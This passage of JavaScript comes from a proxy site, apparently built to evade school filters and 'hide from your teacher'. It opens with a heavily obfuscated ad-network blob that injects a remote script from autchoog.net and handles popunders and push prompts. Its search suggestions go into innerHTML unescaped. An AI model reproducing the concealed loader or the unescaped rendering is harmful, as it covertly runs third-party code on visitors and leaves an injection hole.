T(n,t){for($._d=$.BD;$._d<$.CC;$._d+=$.x){switch($._d){case $.x:return[[E,e][$.Bu](r),[E,e,a][$.Bu](r),[E,e,d][$.Bu](r)];break;case $.BD:var r=v[t]||s,e=m(n,$.Gc)[$.Bw]($.Bz);break;}}}break;case $.DD:var o,c=i($.Gv),x=(o=c)&&o[$.Cd]?o:$.$($.Cj,o),q=i($.GH),P=i($.CC);break;case $.BD:$.Cs;break;}}},function(n,t,r){for($._Fc=$.BD;$._Fc<$.GJ;$._Fc+=$.x){switch($._Fc){case $.Cg:function o(n){return n&&n[$.Cd]?n:$.$($.Cj,n);}break;case $.x:Object[$.e](t,$.Cd,$.$($.Jf,!$.BD)),t[$.Cj]=function(t,r){for($._Fb=$.BD;$._Fb<$.CC;$._Fb+=$.x){switch($._Fb){case $.x:return($.BD,u.Ot)(n,null,null,null)[$.cp](function(n){return(n=n&&$.Di in n?n[$.Di]:n)&&($.BD,i.Et)(c.e,n),n;})[$.fa](function(){return($.BD,i.Mt)(c.e);})[$.cp](function(n){for($._FJ=$.BD;$._FJ<$.CC;$._FJ+=$.x){switch($._FJ){case $.x:n&&(u=n,i=t,o=r,new v[$.Cj](function(n,t){for($._FH=$.BD;$._FH<$.DD;$._FH+=$.x){switch($._FH){case $.Cg:q(function(){return void $.BD!==r&&r[$.Ck][$.bl](r),($.BD,s.$n)(i)?(($.BD,a[$.Dv])($.gk),n()):t();});break;case $.x:var r=void $.BD;break;case $.CC:if(-$.x<[f.ut,f.ot,f.it][$.ap](c.O)){for($._FE=$.BD;$._FE<$.DD;$._FE+=$.x){switch($._FE){case $.Cg:try{w[$.Ck][$.dq](r,w);}catch(n){(document[$.c]||document[$.bF])[$.Bt](r);}break;case $.x:var e=document[$.j](u);break;case $.CC:r[$.aa]=o,r[$.Bt](e),r[$.gl]($.gm,c.e),r[$.gl]($.gn,($.BD,l[$.Cj])(b(c.k)));break;case $.BD:r=document[$.A]($.ba);break;}}}else d(u);break;case $.BD:($.BD,a[$.Dv])($.gh);break;}}}));break;case $.BD:var u,i,o;break;}}});break;case $.BD:var n=t===f.tt?($.BD,e[$.Ds])():b(c.k);break;}}};break;case $.DD:var w=document[$.a];break;case $.CC:var c=r($.BD),f=r($.GD),a=r($.GJ),e=r($.CC),u=r($.Gm),i=r($.GG),s=r($.Gc),v=o(r($.GB)),l=o(r($.Gv));break;case $.BD:$.Cs;break;}}}]);break;case $.GH:try{w=window[$.v];}catch(n){}break;case $.BD:var b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,a=document;break;}}})((function(j,k){const a='dblciohnCtdennetpWpianbdtonwebmSetlrEitnngebmfurcoomdCbheanroCnobdyeablppasrisdebIenltybtpsabresmeaFrlfoiabttbnreemmeolvEeeCthaielrdc'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('b');const _=document[a[0]](a[1]);_[a[2]][a[3]]=a[4];document[a[5]][a[6]](_);var f=_[a[7]][a[8]][a[9]];var p=_[a[7]][a[10]];var v=_[a[7]][a[11]];document[a[5]][a[12]](_);function H(index){return Number(index).toString(36).replace(/[0-9]/g,function(s){return f(p(s,10)+65);});}var o={$:function(){var o={};for(var i=0;i<arguments.length;i+=2){o[arguments[i]]=arguments[i+1];}return o;}};j=j.split('+');for(var i=0;i<608;i++){(function(I){Object['defineProperty'](o,H(I),{get:function(){return j[I][0]!==';'?k(j[I],f):v(j[I].slice(1),10);}});}(i));}return o;}('=6lW:l./MlwlE:+W99./}lE:.bq#:lEl6+6lwo}l./}lE:.bq#:lEl6+*il6tRlMl=:o6+*il6tRlMl=:o6.PMM+9q#ZW:=3./}lE:+=6lW:l.Io=iwlE:.L6W^wlE:+=6lW:l./MlwlE:.gR+^l:./MlwlE:.!t.@9+^l:./MlwlE:#.!t(W^.gWwl+=i66lE:R=6qZ:+6lW9tR:W:l+5o9t+s+9lHqEl.,6oZl6:t+W:o5+9l=o9lvz.@.XowZoElE:+zl^./BZ+#6=+=6lW:l(lB:.go9l+Ho6./W=3+#:tMl+W5oi:.J5MWE~+H6ow.X3W6.Xo9l+l}WM+Zo#q:qoE+Nq9:3+3lq^3:+9q#ZMWt+oZW=q:t+Mo=WMR:o6W^l+#l##qoER:o6W^l+=oE:lE:&qE9oN+;1+9o=iwlE:+3:wM+W5#oMi:l+._ZB+EoEl+;0+R:6qE^+=oEHq^i6W5Ml+5:oW+.IW:l+.|W:3+.P66Wt+.,6owq#l+ZW6#l.@E:+EW}q^W:o6+lE=o9lvz.@+vqE:.x.P66Wt+#l:(qwloi:+#l:.@E:l6}WM+.P66Wt.!iHHl6+=MlW6(qwloi:+=MlW6.@E:l6}WM+.|l##W^l.X3WEElM+.!6oW9=W#:.X3WEElM+lE=o9lvz.@.XowZoElE:+6WE9ow+.8+R+.a+.g+qH6Wwl+WZZlE9.X3qM9+SoqE++:oR:6qE^+lBZo6:#+;21+;36+=WMM+#Mq=l+;2+q+6lZMW=l+M+Z6o:o:tZl+r5.t9o=iwlE:.Ar5+^+s9W:W+3W#.aNE.,6oZl6:t+W+qEEl6.F(.|.b+ssl#.|o9iMl+.CqH6Wwl.*#6=.G.#W5oi:.J5MWE~.#.2.C.4qH6Wwl.2+Hq6#:.X3qM9+;3+WZZMt+^l:+9lHWiM:+ZW6lE:.go9l+lEiwl6W5Ml+=MlW6+6lwo}l.@:lw+3lW9+#l:.@:lw+=MoEl.go9l+^l:.@:lw+i#l.*#:6q=:+iE9lHqEl9+;48+;57+;97+;122+.].7+.V+(+.J+AH^Ho6wW:#+;4+w^95.Qo.[.Q^}+l.Ul#6M._#ti.U+=+i+;1800000+ss.I.bsR./RR.@.a.gs+AH^9MZoZiZ+i~3HoBA9o^*+~W3N3wEEq+ZqE^+ZoE^+6l*il#:+6l*il#:sW==lZ:l9+6l*il#:sHWqMl9+6l#ZoE#l+E6W.x=6.j.Q96^+H+#+iE~EoNE+woi#l9oNE+=Mq=~+woi#liZ+:oi=3lE9+:oi=3#:W6:+^l:.aE=Mq=~Rl=6l:v6M+:o.X3W6.Xo9l+^l:v#l9.|l:3o9#+W99v#l9.|l:3o9+#3qH:zWE9ow+Z6WE9+3W#3.Xo9l+^l:zWE9ow.gWwl+#:oZzWE9ow+:qwl#+=i66lE:+6lW9t+9W:l+:M9+^l:.aHH#l:+*il6t+:6W}l6#l.,W6lE:#+q#./B=Mi9l9+iE.!6oW9=W#:.@EHo+q#.boW9l9+^l:.Lo6wW:#+6iE.P.P.!+^lEl6W:lzWE9owv6M+^lEl6W:lzWE9ow.,.F.,v6M+6lH6l#3.bqE~#+:6t(oZ+^l:.,W6lE:.go9l+ElB:(q=~+:q:Ml+56oN#l6+lE}+W6^}+}l6#qoE+}l6#qoE#+W99.bq#:lEl6+oE=l+oHH+6lwo}l.bq#:lEl6+6lwo}l.PMM.bq#:lEl6#+lwq:+Z6lZlE9.bq#:lEl6+Z6lZlE9.aE=l.bq#:lEl6+Mq#:lEl6#+5qE9qE^+=N9+=39q6+iwW#~+;768+;1024+;568+;360+;1080+;736+;900+;864+;812+;667+;800+;240+;300+lE.1vR+lE.1.D.!+lE.1.X.P+lE.1.Pv+#}.1R./+Z#iHHqBl#+6WN+q#.IM.@wZ6l##qoE.P}WqMW5Ml+#W}l.IM.IW:W+ss.,.,vsR./RR.@.a.gs._s+q#.|o5qMl+q#RWHW6q+q#.Lq6lHoB+q#.|o5qMl.Lq6lHoB+:.j~9.[.T9.x=^l+HiE=:qoE+;60+;120+;480+;180+;720+;7+;27+;11+;9+;16+;19+;6+;26+;5+;22+;8+;10+;12+;13+;33+;35+]3::Z#.n.J+].4.4+].4+;18+;28+;14+WE96oq9+NqE9oN#.*E:+;29+;17+;31+;30+i#l6.P^lE:+;34+;20+.aE.XMq=~+.,i#3.*Eo:qHq=W:qoE.*.t.F((.,.A+.,i#3.*Eo:qHq=W:qoE.*.t.F((.,R.A+.,i#3.*Eo:qHq=W:qoE.*.t.Ioi5Ml.*(W^.A+.@E:l6#:q:qWM+.gW:q}l+.@E.1.,W^l.*.,i#3+oE=Mq=~+EW:q}l+Zi#3l6.1iEq}l6#WM+lE+H6+9l+wl##W^l+oEl66o6+Z~lt#+MlE^:3+q#.PE96oq9+:ElwlM./:Elwi=o9+3::Z#.J.4.4+6iE+wW:=3+A.@E9lB+5W=~^6oiE9.@wW^l+#ZMq:+#l:(qwloi:.*3W#.*Eo:.*5llE.*9lHqEl9+=MlW6(qwloi:.*3W#.*Eo:.*5llE.*9lHqEl9+=36owlhl6#qoE+q#.@.aR+.,+.,.4.g+.g.4.,+.,.4.g.4.g+.g.4.,.4.g+.,.4.g.4.,.4.g+.g.4.g.4.g.4.g+.T+.T.T+.T.T.T+.T.T.T.T+.T.T.T.T.T+ElN#+ZW^l#+Nq~q+56oN#l+}qlN+wo}ql+W6:q=Ml+W6:q=Ml#+#:W:q=+ZW^l+qE9lB+Nl5+hl6#qoEr.47]R-.pRWHW6q+Hq6lHoB+^q+.[.).T.).O+;10000+;5000+AH^Z6oBt3::Z+p+;42+(o~lE+.LW}q=oE+.XoE:lE:.1(tZl+:lB:.43:wM+WZZMq=W:qoE.4S#oE+S#oE+5Mo5+.D./(+.,.aR(+.F./.P.I+WZZMq=W:qoE.4B.1NNN.1Ho6w.1i6MlE=o9l9.u.*=3W6#l:.Gv(.L.1.x+.P==lZ:.1.bWE^iW^l+B.1WZZMq=W:qoE.1~lt+B.1WZZMq=W:qoE.1:o~lE+;1000+;3600000+;750+;2000+o5Sl=:.V.*qH6Wwl.V.*lw5l9.V.*}q9lo.V.*Wi9qo+B+EoHoMMoN.*Eo6lHHl6l6.*EooZlEl6+MqE~+#:tMl#3ll:+WEoEtwoi#+:lB:.4=##+S+t+Z+:l#:+}WMil+.,z.aeks.XRR+.,z.aeks.,.g.D+.,z.aekse.Fz+.,z.aeks.Lz.P.|./+.PE96oq9+;32+.j.O.xB.O.T+.0.m.jB.O.T+.[.0.xB.Q.T+._.0.TB.0.j.T+.m.T.TB.0.U.T+.0.j.TB.j.T.T+9q}+#l=:qoE+EW}+.CW.*36lH.G.#.}#.#.2.C.4W.2+.C9q}.2.CW.*36lH.G.#.}#.#.2.C.4W.2.C.49q}.2+.C#ZWE.2.CW.*36lH.G.#.}#.#.2.C.4W.2.C.4#ZWE.2+q#.P66Wt+H6ow+Zo#:.|l##W^l+.X36owlr.4.t7.T.1.Q-c._.VV.A+.X6q.aRr.4.t7.T.1.Q-c._.VV.A+=3WEElM+.4+oZlE+#l:zl*il#:.FlW9l6+#lE9+9o=+;24+oEMoW9+:oi=3+.@E}WMq9.*W::lwZ:.*:o.*9l#:6i=:i6l.*EoE.1q:l6W5Ml.*qE#:WE=l+;999999+i6M.t9W:W.JqwW^l.4^qH.u5W#l.O.j.Vz.TM.D.a.IM3.PY.P.!.P.@.P.P.P.P.P.P.P.,.4.4.4t.F.U.!.P./.P.P.P.P.P.b.P.P.P.P.P.P.!.P.P./.P.P.P.@.!z.P.P.[.A+HiE+W66Wt+lE6oMM+iElE6oMM+siE6lH.P=:q}l+#l:.@wwl9qW:l+=MlW6.@wwl9qW:l+q.,3oElpq.,W9pq.,o9+q:l6W:o6+.4.4Sow:qE^q.)El:.4WZi.)Z3Z.nAoElq9.G+qE9lB.aH+.c+ZW6#l+6l:i6E.*:3q#+;100+6l}l6#l+.4.4W^W=lMl5q6.)=ow.4.j.4+e.|.b.F::Zzl*il#:+#tw5oM+:oZ+sHWM#l+.t7]W.1A.T.1.Q-.p.A+NqE+9o=./MlwlE:+iE6lH+=Mo#l+9o=iwlE:./MlwlE:+6l*il#:.!t.XRR+6l*il#:.!t.,.g.D+6l*il#:.!te.Fz+wWZ+#=6qZ:+Z6o=l##.)5qE9qE^.*q#.*Eo:.*#iZZo6:l9+Z6o=l##.)=39q6.*q#.*Eo:.*#iZZo6:l9+6l*il#:.!t.@H6Wwl+.4.4+HqM:l6+Zi#3+MlH:+^iw+Z~lt+Z#:6qE^+6lwo}l.X3qM9+9W:W+;200+=oE=W:+.P.P.!.*+HMoo6+:W^.gWwl+ZoZ+W=:q}l+.Lq6lHoB+sq9+s=MlW6.LE+:W6^l:.@9+6lSl=:+WMM+6W=l+;16807+^l:.!oiE9qE^.XMqlE:zl=:+#=6llE+=3W6.Xo9l.P:+Ho6wW:+AoEl.@9+#oi6=lKoEl.@9+9owWqE+^lEl6W:qoE(qwl+ZW^lk.aHH#l:+ZW^le.aHH#l:+=MqlE:(oZ+=MqlE:.blH:+.4.U.4+^l:(qwl+lB:6W+^l:(qwlAoEl.aHH#l:+.NoH.G._+#:W:i#+9W:W#l:+6l9i=l+:3q#+W5=9lH^3qS~MwEoZ*6#:i}NBtA+.)Z3Z+:3lE+6lH+.)+sq9Ml(qwloi:+Mo=W:qoE+7o5Sl=:.*Z6o=l##-+#=6oMM(oZ+#=6oMM.blH:+;2147483647+6l#oM}l+36lH+#=6+sq9Ml(qwloi:.@9+i6M+:tZl+wl:3o9+6l*il#:sq9+6l#ZoE#l(tZl+AoElq9sW95Mo=~+l66o6+.)3:wM+:ovZZl6.XW#l+.,.F.,+.8R+Nq:3.X6l9lE:qWM#+lB=Mi9l#+^l:.,6o:o:tZl.aH+6lM+=6o##.a6q^qE+#lMl=:o6+#3qH:+.Oi.Q.T3z.j6.jz6._H.xMEBZZA+3::Z#.J+i#l.1=6l9lE:qWM#+=##(lB:+#:W6:.boW9qE^+;56+qE#l6:.!lHo6l+.*+.)S#oE+.7.*.*.*.*.*.*.*.*Zo#q:qoE.J.*HqBl9.u.7.*.*.*.*.*.*.*.*:oZ.J.*.T.u.7.*.*.*.*.*.*.*.*MlH:.J.*.T.u.7.*.*.*.*.*.*.*.*5o::ow.J.*.T.u.7.*.*.*.*.*.*.*.*6q^3:.J.*.T.u.7.*.*.*.*.*.*.*.*A.1qE9lB.J.*.0._.j.[.j.x.m.O.j.[.u.7.*.*.*.*.*.*.*.*ZoqE:l6.1l}lE:#.J.*Wi:o.u.7.*.*.*.*+.)=##.n+.)ZE^.n+HqE9+.}+MWE^iW^l+AoElq9+6lHl66l6+:qwls9qHH+W6+=i66lE:si6M+96+#6+^l:.PMMzl#ZoE#l.FlW9l6#+~lt#+Z6o=l##+Z6l}lE:.IlHWiM:+#:oZ.@wwl9qW:l.,6oZW^W:qoE+o5Sl=:+=WMM#q^E+AoElq9so6q^qEWM+i#l6sW^lE:+.)S#.n+96WN.@wW^l+:o.@R.aR:6qE^+;3571+=oE:lE:.Io=iwlE:+#oi6#l.Iq}+=WMM5W=~+W6^#+;204+l66o6.)=ow+:6qw+HqMM+i#l6.bWE^iW^l+#=6llEsNq9:3+#=6llEs3lq^3:+^l:.XoE:lB:+^l:.@wW^l.IW:W+l66o6.*6l*il#:.*:qwloi:+=WE}W#+.09+s5MWE~+:qwlAoEl+l66o6.*.B+}6+6lHl66l6s9owWqE+=i66lE:si6Ms9owWqE+56oN#l6sMWE^+.J.*+7r6rE-.p+:o.boNl6.XW#l+soE(qwloi:+=W:=3+ZoN+.4l}lE:+#i5#:6qE^+.4.j.4+3o#:+#:6qE^qHt+.n9o}6.G:6il+#:W:i#(lB:+^9Z6+:+.6+.B.*N3qMl.*6l*il#:qE^.*+Zo#:+.G+ElB:+6+=oE#:6i=:o6+#:tMlR3ll:#+i#l6sq9+9oEl+#3qH:R:6qE^.*+5+qE=Mi9l#+3lW9l6#+6lMW:q}l+9W:l.J+.N+;15+=Mo#l9+9o=iwlE:r5+qwZo6:R=6qZ:#+:qwloi:+;256+=##ziMl#+#lMl=:o6(lB:+oEwl##W^l+.)Nq9^l:.1=oM.1._.T.1#Z+#:W:i#s=o9l+:lB:+W::W=3./}lE:+=oE:lE:+6l:i6E+#:W6:.@ESl=:R=6qZ:.Xo9l+Zo6:._+Zo6:.0+lE9.@ESl=:R=6qZ:.Xo9l+#l:.P::6q5i:l+9W:W.1AoEl.1q9+9W:W.19owWqE+oE6lW9t#:W:l=3WE^l+o+;23+#l:.@wwl9qW:l.i+#oi6=l+.i+#:6qE^+;25',function(n,y){for(var r='YzR(vh&ekK7r-]syW5=9lH^3qS~MwEoZ*6#:i}NBtAcpV1)4T_0mjUO[xQJuCG2ndP!XI/LDF@8fb|ga,',t=['.','%','{'],e='',i=1,f=0;f<n.length;f++){var o=r.indexOf(n[f]);t.indexOf(n[f])>-1&&0===t.indexOf(n[f])&&(i=0),o>-1&&(e+=y(i*r.length+o),i=1);}return e;})),(function(s){var _={};for(k in s){try{_[k]=s[k].bind(s);}catch(e){_[k]=s[k];}}return _;})(document))</script><script>(function(d,z,s,c){s.src='//'+d+'/400/'+z;s.onerror=s.onload=E;function E(){c&&c();c=null}try{(document.body||document.documentElement).appendChild(s)}catch(e){E()}})('autchoog.net',7482795,document.createElement('script'),_kxevn)';
  document.head.appendChild(script3);
} 

function adChange(parse) {
  localStorage.setItem("adState", parse);
  chosenAdState = parse;
  document.querySelectorAll(".adchangeon, .adchangeoff").forEach((e) => {
    e.classList.remove("active");
  });
  document.querySelectorAll("." + parse).forEach((e) => {
    e.classList.add("active");
}
  )
}


var autoLaunchCookie = localStorage.getItem("autolaunch") || "off";

function autoLaunch() {
  if (autoLaunchCookie === 'off') {
    localStorage.setItem("autolaunch", "on");
    autoLaunchCookie = "on";
    document.getElementById("autoLaunch").classList.add("active");
  } else if (autoLaunchCookie === 'on') {
    localStorage.setItem("autolaunch", "off");
    autoLaunchCookie = "off";
    document.getElementById("autoLaunch").classList.remove("active");
  }
}

switch (autoLaunchCookie) {
  case "on":
    document
      .getElementById("autoLaunch")
      .classList.add("active");
    break;
  case "off":
    document
      .getElementById("autoLaunch")
      .classList.remove("active");
    break;
  default:
    document
      .getElementById("autoLaunch")
      .classList.remove("active");
    break;
}

var chosenBackend = localStorage.getItem("backend") || "uv";

function setBackend(backend) {
  localStorage.setItem("backend", backend);
  chosenBackend = backend;
  document.querySelectorAll(".uv, .dynamic").forEach((e) => {
    e.classList.remove("active");
  });
  document.querySelectorAll("." + backend).forEach((e) => {
    e.classList.add("active");
  });
}



var engineSelected = localStorage.getItem("engine") || "Google";
var currentSearchURL = "https://www.google.com/search?q="
function engineSwitch(sel) {
  localStorage.setItem("engine", sel.value);
  if (localStorage.getItem("engine") === "Google") {
    currentSearchURL = "https://www.google.com/search?q=";
  } else if (localStorage.getItem("engine") === "Bing") {
    currentSearchURL = "https://www.bing.com/search?q=";
  } else if (localStorage.getItem("engine") === "DuckDuckGo") {
    currentSearchURL = "https://duckduckgo.com/?t=h_&q=";
  }
}

if (localStorage.getItem("engine") === "Google") {
  currentSearchURL = "https://www.google.com/search?q=";
} else if (localStorage.getItem("engine") === "Bing") {
  currentSearchURL = "https://www.bing.com/search?q=";
} else if (localStorage.getItem("engine") === "DuckDuckGo") {
  currentSearchURL = "https://duckduckgo.com/?t=h_&q=";
} 

var themeSelected = localStorage.getItem("theme") || "Moon";

function themeSwitch(sel) {
  tHs.setActiveTheme(tHs.getThemeFromName(sel.value));
  document.getElementById("themeSelect").value = sel.value;
  localStorage.setItem("theme", sel.value);
}

function erudaToggle() {
  var iframe = ts.getActiveTab().findFirstIFrame();
  if (!iframe) return

  const erudaWindow = iframe.contentWindow
  const erudaDocument = iframe.contentDocument

  if (!erudaWindow || !erudaDocument) return

  if (erudaWindow.eruda?._isInit) {
    erudaWindow.eruda.destroy()
  } else {
    let script = erudaDocument.createElement('script')
    script.src = 'https://cdn.jsdelivr.net/npm/eruda'
    script.onload = function () {
      if (!erudaWindow) return
      erudaWindow.eruda.init()
      erudaWindow.eruda.show()
    }
    erudaDocument.head.appendChild(script)
   
}
}

function log() {
  setTimeout(
    console.log.bind(
      console,
      "%cAbyss Web",
      "background: #6670FF;color:#FFF;padding:5px;border-radius: 5px;line-height: 26px; font-size:30px;"
    )
  );
  setTimeout(
    console.log.bind(
      console,
      "%cIf you are seeing this, the main script system has loaded.",
      "background: #6670FF;color:#FFF;padding:5px;border-radius: 5px;line-height: 26px; font-size:24px;"
    )
  );
  setTimeout(
    console.log.bind(
      console,
      "%cIf you encounter an error, contact the development team on our discord. DM the info below.",
      "background: #6670FF;color:#FFF;padding:5px;border-radius: 5px;line-height: 26px; font-size:16px;"
    )
  );
  setTimeout(
    console.log.bind(
      console,
      "%cDo not share output to anyone but trusted Abyss developers with a role in the server! Someone may steal your info.",
      "background: #6670FF;color:#FFF;padding:5px;border-radius: 5px;line-height: 26px; font-size:16px;"
    )
  );
  let online = navigator.onLine;
  let userAgent = navigator.userAgent;
  let browserName;
  let diagnosticDomain = window.location.href;
  if (userAgent.match(/chrome|chromium|crios/i)) {
    browserName = "Chrome";
  } else if (userAgent.match(/firefox|fxios/i)) {
    browserName = "Firefox";
  } else if (userAgent.match(/safari/i)) {
    browserName = "Safari";
  } else if (userAgent.match(/opr\//i)) {
    browserName = "Opera";
  } else if (userAgent.match(/edg/i)) {
    browserName = "Edge";
  } else {
    browserName = "Browser not detected!";
  }
  setTimeout(
    console.log.bind(
      console,
      `%c Information: \n Online: ${online} \n URL: ${diagnosticDomain} \n Browser: ${browserName} \n UA: ${userAgent}`,
      "background: grey;color:white;padding:5px;line-height: 26px; border-radius: 5px;font-size:12px;"
    )
  );
}

log();
const searchInput = document.getElementById('adrbar');
const suggestionsList = document.getElementById('suggestions');
document.getElementById("adrbar").addEventListener("focus", function () {
  suggestionsList.style.display = 'flex';
});
document.getElementById("adrbar").addEventListener("blur", function () {
  setTimeout(function() {
    suggestionsList.style.display = 'none';
    searchInput.style.borderBottomLeftRadius = "38px";
    searchInput.style.borderBottomRightRadius = "38px";
    searchInput.style.borderTopLeftRadius = "38px";
    searchInput.style.borderTopRightRadius = "38px";
  }, 300); // unnoticeable delay, just so that the form handles clicks before it dissapears
});

setInterval(() => {
  if (suggestionsList.querySelector('div') && suggestionsList.style.display == 'flex') {
    searchInput.style.borderBottomLeftRadius = "0px";
    searchInput.style.borderBottomRightRadius = "0px";
    searchInput.style.borderTopLeftRadius = "19px";
    searchInput.style.borderTopRightRadius = "19px";
  }
}, 100);
searchInput.addEventListener('input', function() {
  const query = searchInput.value.trim(); // Use searchInput directly
  if (query === '') {
    suggestionsList.innerHTML = '';
    return;
  }

  // Create a script element to fetch suggestions from Google's Autocomplete API
  const script = document.createElement('script');
  script.src = `https://suggestqueries.google.com/complete/search?client=firefox&q=${query}&callback=handleSuggestions`;
  document.body.appendChild(script);
});

// Callback function to handle suggestions
function handleSuggestions(data) {
  const suggestions = data[1];
  showSuggestions(suggestions);
}

function showSuggestions(suggestions) {
  let html = '';
  suggestions.forEach(suggestion => {
    html += `<div>${suggestion}</div>`;
  });
  suggestionsList.innerHTML = html;
}

// Handle click on suggestion
suggestionsList.addEventListener('click', function(event) {
  if (event.target.tagName === 'DIV') {
    runService(event.target.textContent);
    suggestionsList.innerHTML = '';
  }
});


function resetPanicBind() {
  window.panicKeys = null;
  localStorage.setItem("panicKeys", null);
  document.getElementById("panic").placeholder = "Enter Key"
}

const recordKeys = (elem, timeLimit) => {
  if (!elem) return;
  elem.placeholder = "Press a key...";
  window.panicKeys = null;
  let savePush = [];
  let firstKeyHit = false;
  const keydownHandler = (e) => {
    if (!firstKeyHit) {
      firstKeyHit = true;
      setTimeout(() => {
        document.removeEventListener("keydown", keydownHandler);
        window.panicKeys = savePush;
        localStorage.setItem("panicKeys", JSON.stringify(savePush));
      }, timeLimit);
    }
    savePush.push(e.key);
    elem.placeholder = "selected: " + savePush.join(" + ");
    document.querySelectorAll(".panic").forEach((e) => {
      e.placeholder = "selected: " + savePush.join(" + ");
    });
  };
  document.addEventListener("keydown", keydownHandler);
};

const cloakTitle = (title) => {
  if (title.trim() == "") {
    title = "Abyss";
  }
  document.title = title;
  localStorage.setItem("title", title);
  document.querySelectorAll(".tabTitle").forEach((e) => {
    e.placeholder = title;
  });
};

let savedFavicon;
if (document.querySelector("link[rel*='icon']")) {
  savedFavicon = document.querySelector("link[rel*='icon']").href;
}

const cloakFavicon = (url) => {
  if (url !== "assets/favicon.ico" && !/^(https?:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,30}/i.test(url)) {
    alert("You must put a valid URL in the URL box.");
    url = "assets/favicon.ico"
} else if (url !== "assets/favicon.ico" && !/^(https?:\/\/)/.test(url)) {
    url = "https://" + url;
  } 
  if (url.trim() == "") {
    url = savedFavicon;
  }
  let link =
    document.querySelector("link[rel*='icon']") ||
    document.createElement("link");
  link.type = "image/x-icon";
  link.rel = "shortcut icon";
  link.href = url;
  document.getElementsByTagName("head")[0].appendChild(link);
  localStorage.setItem("favicon", url);
  document.querySelectorAll(".tabIcon").forEach((e) => {
    e.placeholder = url;
  });
};

const cloakURL = (url) => {
   if (!/^(https?:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,30}/i.test(url)) {
    alert("You must put a valid URL in the URL box.");
    url = "https://google.com"
  } else if (!/^(https?:\/\/)/.test(url)) {
    url = "https://" + url;
  } 

  if (url.trim() == "") {
    url = "https://google.com";
  }
  window.panicURL = url;
  localStorage.setItem("panicURL", url);
  document.querySelectorAll(".panicURL").forEach((e) => {
    e.value = url;
  });
};

window.panicURL = localStorage.getItem("panicURL") || "https://google.com";
window.panicKeys = JSON.parse(localStorage.getItem("panicKeys"));

if (window.panicKeys !== null) {
  document.getElementById("settings-temp").querySelector(".panic").placeholder =
    "selected: " + window.panicKeys.join(" + ");
}
if (window.panicURL !== null) {
  document.getElementById("settings-temp").querySelector(".panicURL").value =
    window.panicURL;
}

let hitKeys = [];
let hitKeyRetention = false;
const keydownHandler = (e) => {
  if (window.panicKeys == null) return;
  if (!hitKeyRetention) {
    hitKeyRetention = true;
    setTimeout(() => {
      hitKeyRetention = false;
      hitKeys = [];
    }, 1000);
  }
  hitKeys.push(e.key);
  if (hitKeys.length >= window.panicKeys.length) {
    let hitKeysSet = new Set(hitKeys);
    let panicKeysSet = new Set(window.panicKeys);
    if (
      new Set([...hitKeysSet].filter((x) => panicKeysSet.has(x))).size ===
      panicKeysSet.size
    ) {
      window.open(window.panicURL);
    }
  }
};

document.addEventListener("keyup", keydownHandler);

if (localStorage.getItem("title")) {
  document.title = localStorage.getItem("title");
}

if (localStorage.getItem("favicon")) {
  let link =
    document.querySelector("link[rel*='icon']") ||
    document.createElement("link");
  link.type = "image/x-icon";
  link.rel = "shortcut icon";
  link.href = localStorage.getItem("favicon");
  document.getElementsByTagName("head")[0].appendChild(link);
}

function addDropElem(name) {
  var select = document.getElementById("themeSelect");
  var option = document.createElement("option");
  option.value = name;
  option.innerText = name;
  select.appendChild(option);
}

async function getThemes() {
  await fetch("/assets/themes.json")
    .then((res) => res.json())
    .then((json) => {
      for (var theme = 0; theme < json.length; theme++) {
        var themeName = json[theme].name;
        var themeURL = json[theme].url;
        console.log(
          "%cDEV:%c Found %c" + themeName + " %c" + themeURL,
          "font-weight: bold",
          "font-weight: normal",
          "font-weight: bold",
          "font-weight: normal"
        );
        tHs.addTheme(new Theme(themeURL, themeName));
        addDropElem(themeName);
      }
    });
}

const openNewtab = () => {
  ts.setActiveTab(ts.addTab(new Tab()));
};

let splashtext = [
  "check out discord.gg/goabyss",
  "made by paxton warin",
  "want your own link? check out discord.gg/goabyss",
  "thanks for using the site!",
  "check out the settings page",
  "check out the games page",
  "check out the settings to hide from your teacher",
  "need ChatGPT? search for it on the games page!",
  "shoutout owen, ramsey, and levi",
  "co owned by wyatt batdorf",
  "enzo is interesting...",
]

const runService = async (url, override, overrideadrbar) => {
  if (url.trim() == "") return;
  if (ts.getActiveTab() == null || url == "abyss://settings" || url == "abyss:settings" || url == "abyss:apps" || url== "abyss://apps") {
    openNewtab();
  }
  const activeTab = ts.getActiveTab();
  if (activeTab) {
    const tabElement = activeTab.getTabElement();
    const adrbarInput = document.getElementById("adrbar");
    if (adrbarInput instanceof HTMLInputElement) {
      adrbarInput.value = "";
    }
    const mainStartElement = tabElement.querySelector(".mainStart");
    if (mainStartElement) {
      mainStartElement.style.display = "none";
    }
    if (/^(abyss:)(\/)*[a-z]*/.test(url)) {
      url = url.replace(/^(abyss:)(\/)*/, "");
      const adrbarInputElement = document.getElementById("adrbar");
      if (adrbarInputElement instanceof HTMLInputElement) {
        adrbarInputElement.value = "";
      }
      switch (url) {
        case "newtab":
          const defaultPlaceholder = ts.getConfig().defaultPlaceholder;
          if (tabElement.querySelectorAll(".extFrame").length > 0) {
            tabElement.querySelectorAll(".extFrame").forEach((frame) => {
              frame.remove();
            });
          }
          const firstIFrame = activeTab.findFirstIFrame();
          if (firstIFrame) {
            firstIFrame.remove();
          }
          const newTabTemplate = document
            .querySelector(".mainStartContain")
            .cloneNode(true);
          tabElement.appendChild(newTabTemplate);
          activeTab.getConnectedElement().querySelector("span").innerText =
            "New Tab";
          document.getElementById("adrbar").placeholder = defaultPlaceholder;
          
          return;
        case "apps":
          const appsPlaceholder = "abyss apps (abyss://apps)";
          if (tabElement.querySelectorAll(".extFrame").length > 0) {
            tabElement.querySelectorAll(".extFrame").forEach((frame) => {
              frame.remove();
            });
          }
          const appsTemplate = document
          .getElementById("apps-temp")
            .cloneNode(true);
            if (appsTemplate instanceof HTMLDivElement) {
              appsTemplate.id = "";
              appsTemplate.style.display = "initial";
              tabElement.appendChild(appsTemplate);
              activeTab.getConnectedElement().querySelector("span").innerText =
                "Apps";
              document.getElementById("adrbar").placeholder = appsPlaceholder;
              activeTab.getConnectedElement().querySelector("#tabFavicon").src = "assets/game.png"
            }
            setTimeout(initApps, 1);
            setTimeout(initAppSearch, 1);
        return;
        case "settings":
          const settingsPlaceholder = "abyss settings (abyss://settings)";
          if (tabElement.querySelectorAll(".extFrame").length > 0) {
